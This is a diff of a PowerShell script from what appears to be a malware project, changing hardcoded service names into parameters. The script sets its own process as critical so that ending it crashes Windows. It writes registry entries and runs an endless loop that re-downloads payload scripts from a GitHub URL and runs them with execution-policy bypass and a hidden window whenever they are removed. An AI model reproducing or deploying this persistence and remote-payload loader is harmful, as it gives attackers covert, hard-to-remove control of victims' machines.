@@ -1,6 +1,8 @@
 param(
     [string]$rootPath,
-    [string]$basePath
+    [string]$basePath,
+    [string]$childServiceName,
+    [string]$childServicePropertyName
 )
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
 
@@ -26,28 +28,28 @@ public class CS {
 Add-Type -TypeDefinition $signature
 [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
-$serviceName = "MyRootMonService"
-$propertyName = "rootMon"
-$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
+
+
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
 $issetup = $false
 
-$initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-$initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
-$rootMonScript = ""
+$initChildServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$initChildServicePath = "$initChildServicePath\init_service_rootmon.ps1"
+$childPath = ""
 
 
 
 
-$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
 if(-not($item)){
-    $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-    $rootMonScript = "$rootMonScript\root_mon.ps1" 
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+    $childPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+    $childPath = "$childPath\root_mon.ps1" 
+    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $childPath -Force | Out-Null
     $issetup = $true
 }
 
 else{
-    $rootMonScript = $item.$propertyName
+    $childPath = $item.$childServicePropertyName
     $issetup = $false
 }
 
@@ -84,24 +86,24 @@ function Get-ServiceName{
 
 while($true){
     $r = Get-ServiceReg -path $regPath
-    $n = Get-ServiceName -name $serviceName
+    $n = Get-ServiceName -name $childServiceName
 
-    if(-not(Test-Path -Path $rootMonScript -PathType Leaf)){
+    if(-not(Test-Path -Path $childPath -PathType Leaf)){
         if(-not($issetup)){
-            $initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-            $initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
-            $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-            $rootMonScript = "$rootMonScript\root_mon.ps1"
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+            $initChildServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $initChildServicePath = "$initChildServicePath\init_service_rootmon.ps1"
+            $childPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $childPath = "$childPath\root_mon.ps1"
+            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $childPath -Force | Out-Null
         }
-        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
-        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
-        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
+        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $childPath
+        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initChildServicePath
+        powershell.exe -ep bypass -noP -w hidden $initChildServicePath -rootPath $rootPath -scriptPath $childPath -basePath "$b"
     }
     
     elseif($r -or $n){
-        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
-        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
+        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initChildServicePath
+        powershell.exe -ep bypass -noP -w hidden $initChildServicePath -rootPath $rootPath -scriptPath $childPath -basePath "$b"
     }
     $issetup = $false
 }
